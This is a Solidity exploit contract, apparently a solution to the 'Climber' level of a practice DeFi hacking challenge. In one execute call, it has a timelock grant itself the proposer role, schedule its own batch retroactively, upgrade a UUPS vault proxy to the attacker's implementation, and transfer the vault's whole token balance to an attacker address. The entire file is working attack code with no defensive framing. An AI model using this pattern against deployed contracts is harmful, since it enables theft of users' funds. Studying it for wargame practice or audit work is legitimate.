pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

import 'hardhat/console.sol';

contract ClimberStealer is UUPSUpgradeable {
  using Address for address;

  bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

  address immutable vault;
  address immutable timelock;
  IERC20 immutable token;
  address immutable attacker;

  constructor(address _vault, address _timelock, IERC20 _token, address _attacker) {
    vault = _vault;
    timelock = _timelock;
    token = _token;
    attacker = _attacker;
  }

  function makeProposals() public view returns (address[] memory, uint256[] memory, bytes[] memory) {
    address[] memory targets = new address[](4);
    uint256[] memory values = new uint256[](4);
    bytes[] memory data = new bytes[](4);

    targets[0] = timelock;
    values[0] = 0;
    data[0] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));

    // Not needed bc of bug in getOperationState
    /*
    targets[1] = timelock;
    values[1] = 0;
    data[1] = abi.encodeWithSignature("updateDelay(uint64)", 0);
    */

    targets[1] = address(this);
    values[1] = 0;
    data[1] = abi.encodeWithSelector(this.scheduleProposals.selector);
 
    targets[2] = vault;
    values[2] = 0;
    data[2] = abi.encodeWithSignature("upgradeTo(address)", address(this));

    targets[3] = vault;
    values[3] = 0;
    data[3] = abi.encodeWithSelector(this.sweepFunds.selector);

    return (targets, values, data);
  }

  function attack() external {
    (address[] memory targets, uint256[] memory values, bytes[] memory data) = makeProposals();
    timelock.functionCall(abi.encodeWithSignature("execute(address[],uint256[],bytes[],bytes32)",
      targets,
      values,
      data,
      0
    ));
  }

  function scheduleProposals() external {
    (address[] memory targets, uint256[] memory values, bytes[] memory data) = makeProposals();
    timelock.functionCall(abi.encodeWithSignature("schedule(address[],uint256[],bytes[],bytes32)",
      targets,
      values,
      data,
      0
    ));
  }

  function sweepFunds() external {
    token.transfer(attacker, token.balanceOf(address(this)));
  }

  function _authorizeUpgrade(address newImplementation) internal override {}
}
